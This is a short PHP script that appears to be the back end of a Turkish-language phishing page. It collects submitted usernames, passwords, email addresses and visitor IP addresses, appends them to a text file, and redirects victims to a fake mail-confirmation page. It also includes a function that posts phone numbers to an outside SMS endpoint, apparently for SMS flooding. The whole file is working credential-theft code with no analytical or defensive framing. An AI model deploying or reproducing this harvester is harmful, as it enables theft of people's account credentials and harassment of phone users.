<?php
error_reporting(0);
function sms($number){
$url = 'http://derinsms.com/site/hiztesti';
$fields = array(
	'txt_gsmno' => $number
	);
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields);
$result = curl_exec($ch);
curl_close($ch);
}
if($_POST){
$username = $_POST['username'];
$password =  $_POST['password'];
$mail =  $_POST['mail'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hesaplar.txt', 'a'); 
fwrite($file, "-----Mail----->".$mail."-----Kullanici Adi----->".$username."-----Sifre-----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file);
header("Location: mailconfirmation.php");
}
?>